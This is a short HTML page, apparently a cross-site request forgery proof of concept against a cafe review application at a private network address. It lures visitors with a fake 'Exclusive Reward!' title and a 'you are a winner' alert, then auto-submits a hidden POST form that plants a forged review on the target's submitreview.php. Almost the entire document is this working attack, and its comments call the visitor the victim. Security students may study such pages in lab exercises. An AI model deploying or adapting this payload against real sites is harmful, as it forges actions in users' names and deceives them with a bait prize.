<!DOCTYPE html>
<html>
<head>
<title>Exclusive Reward!</title>
</head>
<body>
<h2>Loading offer...</h2>
<?php
session_start();
?>
 
    <!-- Hidden form that targets your viewContent.php file -->
<form id="csrfForm" action="http://10.76.152.14:8888/cafereview/submitreview.php" method="POST" style="display:none;">
<input type="hidden" name="cafe_id" id="cafe_id" value="4">
<input type="hidden"  id="review_text" name="review_text" value="I sneaked into to your db">
<input type="hidden"  id="review_file" name="review_file" value="">
</form>
 
    <script>
        window.onload = function() {
            // Display the alert box to the victim
            alert("congratulations you are a winner");
            // Once the victim clicks "OK", this next line runs and submits the form
            document.getElementById('csrfForm').submit();
        };
</script>
</body>
</html>